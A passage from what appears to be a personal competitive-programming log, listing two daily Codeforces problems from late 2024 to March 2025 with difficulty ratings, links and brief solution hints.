twice.</td></tr></tbody></table><p>12.25</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/938/C">CF938C</a></td><td>Find a way to calculate the answer first. How can you reverse it?</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/755/D">CF755D</a></td><td>It’s about the number of intersections.</td></tr></tbody></table><p>12.26</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1042/C">CF1042C</a></td><td>There are only three types of numbers.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/1610/D">CF1610D</a></td><td>Bezout Theorem.</td></tr></tbody></table><p>12.27</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1223/C">CF1223C</a></td><td>The more the better.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/276/E">CF276E</a></td><td>It’s a tree with a special configuration.</td></tr></tbody></table><p>12.28</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/323/A">CF323A</a></td><td>Learn from the example. For how to prove: connect each block with its neighboring block with the same color.</td></tr><tr><td>2300</td><td><a href="https://codeforces.com/problemset/problem/306/D">CF306D</a></td><td>When you decide the first few edges, the last ones are already settled. How can you make it different?</td></tr></tbody></table><p>12.30</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/51/C">CF51C</a></td><td>It’s just about separating the points into three segments.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/327/D">CF327D</a></td><td>Consider each connected component.</td></tr></tbody></table><p>12.31</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/1575/D">CF1575D</a></td><td>Iterate over $X$ .</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1260/D">CF1260D</a></td><td>It’s more possible to move to the end with less squads.</td></tr></tbody></table><h2 id="2025年"><a href="#2025年" class="headerlink" title="2025年"></a>2025年</h2><h3 id="01月"><a href="#01月" class="headerlink" title="01月"></a>01月</h3><p>01.01</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/769/C">CF769C</a></td><td>For the first few steps, you can use greedy approach, but you should guarantee that you can come back.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/2045/B">CF2045B</a></td><td>$D$ can step in only once.</td></tr></tbody></table><p>01.02</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/581/D">CF581D</a></td><td>There are only a few configurations.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/33/D">CF33D</a></td><td>Circles without intersections can be represented as a tree.</td></tr></tbody></table><p>01.03</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/725/C">CF725C</a></td><td>Only one character appears twice.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/65/C">CF65C</a></td><td>$v_s\leq v_p$ means something.</td></tr></tbody></table><p>01.04</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/704/A">CF704A</a></td><td>You can process each message one by one.</td></tr><tr><td>2300</td><td><a href="https://codeforces.com/problemset/problem/629/E">CF629E</a></td><td>The cycle can be divided into two parts.</td></tr></tbody></table><p>01.06</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/663/A">CF663A</a></td><td>If the numbers on the left side of the equations keep changing, what can the result be?</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/250/D">CF250D</a></td><td>Fix $j$ , what should be the best $i$ ?</td></tr></tbody></table><p>01.07</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/846/B">CF846B</a></td><td>Notice that the data range. Make use of the smaller ones.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/959/D">CF959D</a></td><td>Find the first different value of $a_i$ and $b_i$.</td></tr></tbody></table><p>01.08</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/789/B">CF789B</a></td><td>Special cases need to be taken care of.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/43/D">CF43D</a></td><td>Use chessboard coloring to prove the result.</td></tr></tbody></table><p>01.09</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/360/A">CF360A</a></td><td>Find the array that is most likely to satisfy all the conditions.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/629/C">CF629C</a></td><td>What really matters in the prefix and suffix?</td></tr></tbody></table><p>01.10</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/340/C">CF340C</a></td><td>Consider the occurence of each $|a_i-0|$ and $|a_i-a_j|$ .</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/286/C">CF286C</a></td><td>It’s about a bracket sequence.</td></tr></tbody></table><p>01.11</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/231/D">CF231D</a></td><td>Consider each face separately.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/115/C">CF115C</a></td><td>Consider horizontal lines and vertical lines separately.</td></tr></tbody></table><p>01.13</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/231/D">CF231D</a></td><td>Consider each face separately.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/115/C">CF115C</a></td><td>Consider horizontal lines and vertical lines separately.</td></tr></tbody></table><p>01.14</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/733/C">CF733C</a></td><td>The final array consists of a few segment sums.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1044/B">CF1044B</a></td><td>Use the result of the query to decide the next query.</td></tr></tbody></table><p>01.15</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1043/D">CF1043D</a></td><td>Consider the answer in one array and check it in the others.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/1090/L">CF1090L</a></td><td>Consider whether the total classes and the classes in one auditorium is enough.</td></tr></tbody></table><p>01.16</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/831/C">CF831C</a></td><td>$b_1$ infers possible scores.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/1057/C">CF1057C</a></td><td>The order of eating candies is actually determined by the number of candies in each box.</td></tr></tbody></table><p>01.17</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1482/C">CF1482C</a></td><td>The constraint is not that tight. There’s only one element you should consider.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/1725/F">CF1725F</a></td><td>Note that you can move both left and right using the bits of $k$ .</td></tr></tbody></table><p>01.18</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1722/E">CF1722E</a></td><td>$w_i,h_i$ are not large.</td></tr><tr><td>2400</td><td><a href="https://codeforces.com/problemset/problem/534/F">CF534F</a></td><td>It can be done by joining the left part and the right part together.</td></tr></tbody></table><p>01.20</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/182/E">CF182E</a></td><td>Classic knapsack DP.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1912/D">CF1912D</a></td><td>Translate the conditions into something about number theory.</td></tr></tbody></table><p>01.21</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/180/E">CF180E</a></td><td>Start from a cube, and find out which cubes to delete.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/553/B">CF553B</a></td><td>Find out the necessary pattern of the permutation.</td></tr></tbody></table><p>01.22</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1044/A">CF1044A</a></td><td>Some horizontal lines are just not important.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/615/C">CF615C</a></td><td>How can you find the longest substring that can match with the target substring (starting at $i$ )?</td></tr></tbody></table><p>01.23</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1032/C">CF1032C</a></td><td>Only the neighboring elements are constrained.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/1157/F">CF1157F</a></td><td>Find out the conditions the frequencies of each element should satisfy.</td></tr></tbody></table><p>01.24</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/753/B">CF753B</a></td><td>If you find some information about the target, you can brute-force over the answer.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/466/E">CF466E</a></td><td>The tree can be pre-determined.</td></tr></tbody></table><p>01.25</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/518/A">CF518A</a></td><td>Consider the strings as numbers.</td></tr><tr><td>2400</td><td><a href="https://codeforces.com/problemset/problem/416/D">CF416D</a></td><td>The array can be determined by $2$ elements in it.</td></tr></tbody></table><p>01.27</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/167/B">CF167B</a></td><td>The volume of the bags doesn’t need to be large.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/374/C">CF374C</a></td><td>The whole grid is a graph. Check if it contains a cycle.</td></tr></tbody></table><p>01.28</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/853/B">CF853B</a></td><td>Each person can be considered separately.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/717/E">CF717E</a></td><td>Solve the problem from the subtrees.</td></tr></tbody></table><p>01.29</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/931/C">CF931C</a></td><td>There isn’t much to change.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/1214/E">CF1214E</a></td><td>The distance is no larger than $n$ , so you can use a chain as a baseline.</td></tr></tbody></table><p>01.30</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1257/D">CF1257D</a></td><td>For each index $i$ , you can find out the perfect hero to conquer as many monsters as you want.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/427/E">CF427E</a></td><td>The choice is on one of the given points.</td></tr></tbody></table><p>01.31</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1281/B">CF1281B</a></td><td>Find the first character that can be replaced by something small.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/748/D">CF748D</a></td><td>Strings come in pairs.</td></tr></tbody></table><h3 id="02月-1"><a href="#02月-1" class="headerlink" title="02月"></a>02月</h3><p>02.01</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1137/A">CF1137A</a></td><td>What determines the answer?</td></tr><tr><td>2400</td><td><a href="https://codeforces.com/problemset/problem/1070/I">CF1070I</a></td><td>Find out the purpose of painting two edges into the same color.</td></tr></tbody></table><p>02.03</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/1109/B">CF1109B</a></td><td>First of all, ignore that you need to minimize the number of steps and find a way to make another palindrome.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/457/B">CF457B</a></td><td>There are only a few ways that are possible.</td></tr></tbody></table><p>02.04</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/730/A">CF730A</a></td><td>There are not that many kinds of operations.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1012/C">CF1012C</a></td><td>What is the cost when two houses are chosen with the houses between them unchosen?</td></tr></tbody></table><p>02.05</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/924/C">CF924C</a></td><td>The marks should overlap.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/382/B">CF382B</a></td><td>How does $a-c$ change?</td></tr></tbody></table><p>02.06</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/627/B">CF627B</a></td><td>Find out the formula of the result. It’s easy to update and query.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/1183/G">CF1183G</a></td><td>Use greedy approach to find the largest number of candies. Then decide the types of the candies.</td></tr></tbody></table><p>02.07</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="http://codeforces.com/problemset/problem/1017/C">CF1017C</a></td><td>Dilworth’s theorem.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/1028/D">CF1028D</a></td><td>Think about which prices should be in the buying list and which prices should be in the selling list.</td></tr></tbody></table><p>02.08</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1452/D">CF1452D</a></td><td>Find out the conditions to satisfy and the DP function accordingly.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/627/C">CF627C</a></td><td>The decision whether or not add gas at one station is based on the future. Wait, we know the future.</td></tr></tbody></table><p>02.10</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/1082/D">CF1082D</a></td><td>Construct a chain first and then add nodes on it.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/630/E">CF630E</a></td><td>Count each vertical line.</td></tr></tbody></table><p>02.11</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/979/B">CF979B</a></td><td>The length of the subribbon should be $1$ .</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1184/E1">CF1184E1</a></td><td>Consider the vertices in the edge $1$ as one first.</td></tr></tbody></table><p>02.12</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/518/D">CF518D</a></td><td>How does the people in the queue change in one second?</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/758/D">CF758D</a></td><td>The digits from the back should be as large as possible.</td></tr></tbody></table><p>02.13</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/729/C">CF729C</a></td><td>Consider the cost between two gas stations. How does it change with the tank capacity?</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/237/E">CF237E</a></td><td>Paying to satisfy the conditions and distribution the characters to choose: flow problem.</td></tr></tbody></table><p>02.14</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/939/D">CF939D</a></td><td>It’s all about connecting characters.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/520/D">CF520D</a></td><td>Each step should be optimized.</td></tr></tbody></table><p>02.15</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/660/C">CF660C</a></td><td>Typical sliding window.</td></tr><tr><td>2400</td><td><a href="https://codeforces.com/problemset/problem/1282/E">CF1282E</a></td><td>First of all, you can decide the edges of the polygon: they apear only once.</td></tr></tbody></table><p>02.17</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/772/A">CF772A</a></td><td>If the time is fixed, which devices should you charge?</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/700/A">CF700A</a></td><td>Divide the pupils into groups. Each group should use the same amount of time on the bus.</td></tr></tbody></table><p>02.18</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/190/B">CF190B</a></td><td>Consider the possible positional relationship of two circles.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1141/G">CF1141G</a></td><td>Decide the answer first.</td></tr></tbody></table><p>02.19</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/540/B">CF540B</a></td><td>You just need to find out the minimum sum of marks.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/855/C">CF855C</a></td><td>Each vertice has three kinds of status.</td></tr></tbody></table><p>02.20</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1227/C">CF1227C</a></td><td>Use two operations to swap two elements.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/263/C">CF263C</a></td><td>What is the property of the two neighboring vertices?</td></tr></tbody></table><p>02.21</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/643/B">CF643B</a></td><td>Find the minimum number of edges you needed.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/1510/D">CF1510D</a></td><td>The numbers not chosen are limited.</td></tr></tbody></table><p>02.22</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1036/B">CF1036B</a></td><td>Find the minimum number of steps first. How many of them can be diagonal?</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/1227/E">CF1227E</a></td><td>Each burned tree turned into a square.</td></tr></tbody></table><p>02.24</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/222/C">CF222C</a></td><td>Find the prime factors to delete and then delete them</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1689/D">CF1689D</a></td><td>The result of a absolute function can be transformed into a maximum result of linear functions.</td></tr></tbody></table><p>02.25</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/592/C">CF592C</a></td><td>What should the final length be?</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/930/C">CF930C</a></td><td>How can you check if the current result can be formed with all intervals containing one integer?</td></tr></tbody></table><p>02.26</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1320/B">CF1320B</a></td><td>You should calculate the distance to the destination.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/374/A">CF374A</a></td><td>Where can you go from $(i, j)$ ? How can you calculate the number of moves?</td></tr></tbody></table><p>02.27</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/923/A">CF923A</a></td><td>If $X_i$ is fixed, find out about $X_{i-1}$ .</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/1599/C">CF1599C</a></td><td>If you study $k$ maps, what is the probability to play one of them?</td></tr></tbody></table><p>02.28</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1468/K">CF1468K</a></td><td>The obstacle need to block the way.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/1267/K">CF1267K</a></td><td>It’s just about how many permutations of the given array is valid. What’s the condition of being valid?</td></tr></tbody></table><h3 id="03月-1"><a href="#03月-1" class="headerlink" title="03月"></a>03月</h3><p>03.01</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1238/C">CF1238C</a></td><td>What is the bad thing that causes you to use the magic crystal?</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/1225/E">CF1225E</a></td><td>Once you leave a column &#x2F; row, it means nothing to you.</td></tr></tbody></table><p>03.03</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/958/F2">CF958F2</a></td><td>Classic two pointers.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/803/D">CF803D</a></td><td>If $x$ is enough, $x + 1$ is always enough.</td></tr></tbody></table><p>03.04</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/923/C">CF923C</a></td><td>You need to find a data structure that can do something like: deleting an element, find the maximum XOR value with $x$ .</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1611/E2">CF1611E2</a></td><td>Which nodes does your friend forbid you to go?</td></tr></tbody></table><p>03.05</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/439/C">CF439C</a></td><td>Enough odd numbers and enough partitions.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/187/C">CF187C</a></td><td>If you got a value $q$ , how can you get the connected component where any two vertices can reach each other?</td></tr></tbody></table><p>03.06</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1340/B">CF1340B</a></td><td>Make the first digit large enough and make it possible for the latter digits.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/2052/J">CF2052J</a></td><td>For a given $t$ , how should you arrange the activities?</td></tr></tbody></table><p>03.07</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1875/D">CF1875D</a></td><td>The MEX of the array changes only a few times.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/1866/H">CF1866H</a></td><td>For each array of sets, there can be only one order that satisfies the conditions.</td></tr></tbody></table><p>03.08</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/756/B">CF756B</a></td><td>Iterate over the last ticket.</td></tr><tr><td>2400</td><td><a href="https://codeforces.com/problemset/problem/1080/E">CF1080E</a></td><td>Fix $(j_1,j_2)$ to find the possible $(i_1,i_2)$.</td></tr></tbody></table><p>03.10</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/675/D">CF675D</a></td><td>Find a rule of the parent node.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/909/E">CF909E</a></td><td>It’s just rounds of task completion.</td></tr></tbody></table><p>03.11</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/123/B">CF123B</a></td><td>It’s about crossing lines. You can cross $2$ at a time.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/342/C">CF342C</a></td><td>There are only a few ways to put the balloons.</td></tr></tbody></table><p>03.12</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1906/M">CF1906M</a></td><td>Find different upper bounds.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/542/C">CF542C</a></td><td>Consider the array as a graph. What does the final answer satisfy?</td></tr></tbody></table><p>03.13</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/980/C">CF980C</a></td><td>Still. Lexicographically smallest. From the front, greedily choose. Notice the constraint of $k$ .</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/193/B">CF193B</a></td><td>The operations can’t be fully comprehended when they are mixed, so there is only one way …</td></tr></tbody></table><p>03.14</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/733/D">CF733D</a></td><td>For each stone, find its perfect match.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/342/D">CF342D</a></td><td>How can you move a domino?</td></tr></tbody></table><p>03.15</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/595/B">CF595B</a></td><td>Just calculate the answer for each part.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/305/D">CF305D</a></td><td>There are some basic rules for this graph.</td></tr></tbody></table><p>03.17</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/883/K">CF883K</a></td><td>Let’s maximize the $s_i’$ of each part.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1977/C">CF1977C</a></td><td>Two kinds: whether LCM is $\max(a_i)$ or not.</td></tr></tbody></table><p>03.18</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/1955/F">CF1955F</a></td><td>It’s just about maximizing the number of $0$ in suffix-XOR-sum.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/848/B">CF848B</a></td><td>On what condition does the dancers collide? After collision, if you don’t care which is which, they look like they are on the original route.</td></tr></tbody></table><p>03.19</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1850/H">CF1850H</a></td><td>It’s about contradiction in a graph.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/2041/M">CF2041M</a></td><td>If you sort $[1,i]$, what is your next move?</td></tr></tbody></table><p>03.20</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/910/C">CF910C</a></td><td>Let’s see the weight of each character.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/1956/D">CF1956D</a></td><td>If there is a segment that is operated, what is its maximum sum?</td></tr></tbody></table><p>03.21</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/214/B">CF214B</a></td><td>You don’t need to delete many characters.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/590/B">CF590B</a></td><td>If you can get to the destination in $t$ seconds, it’s always possible to get there in 